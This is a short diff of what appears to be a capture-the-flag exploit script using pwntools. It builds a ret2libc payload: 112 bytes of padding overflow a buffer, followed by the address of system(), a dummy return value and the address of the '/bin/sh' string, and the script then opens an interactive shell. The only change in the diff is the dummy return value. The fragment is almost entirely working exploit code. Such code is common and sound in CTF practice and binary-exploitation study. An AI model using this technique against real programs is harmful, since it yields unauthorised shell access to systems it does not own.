@@ -21,7 +21,7 @@ system_addr = libcbase + libc.dump('system')
 binsh_addr = libcbase + libc.dump('str_bin_sh')
 
 print("get shell")
-payload = flat([b'A' * 112, system_addr, 0xdeadbeef, binsh_addr])
+payload = flat([b'A' * 112, system_addr, b'bbbb', binsh_addr])
 sh.sendline(payload)
 
 sh.interactive()
